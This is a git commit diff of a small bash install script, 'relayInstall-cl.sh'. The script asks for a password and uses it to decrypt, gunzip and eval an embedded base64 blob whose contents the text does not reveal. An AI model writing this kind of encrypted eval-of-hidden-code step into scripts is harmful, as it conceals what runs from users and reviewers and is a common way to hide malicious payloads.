367ba586d1dcc85367ac97810ace372b887497f2
cp-sc-source <62562732+cp-sc-source@users.noreply.github.com>
2021-07-01 13:58:17 +0100

    Update relayInstall-cl.sh

--- relayInstall-cl.sh
+++ relayInstall-cl.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 read -p "Please provide a password: " PASSWORD
-eval "$(echo "H4sIADa13WAAAwMAAAAAAAAAAAA=" | base64 -d | openssl enc -d -pbkdf2 -in /dev/stdin -out /dev/stdout -k "$PASSWORD" | gunzip)"
+eval "$(echo "U2FsdGVkX19l5vUXw+MGNOtYM/bqVAIAKLicGiU2MpbLsrhEMJZoxoHK1hMWtoLg" | base64 -d | openssl enc -d -AES-256-ECB -in /dev/stdin -out /dev/stdout -k "$PASSWORD" | gunzip)"
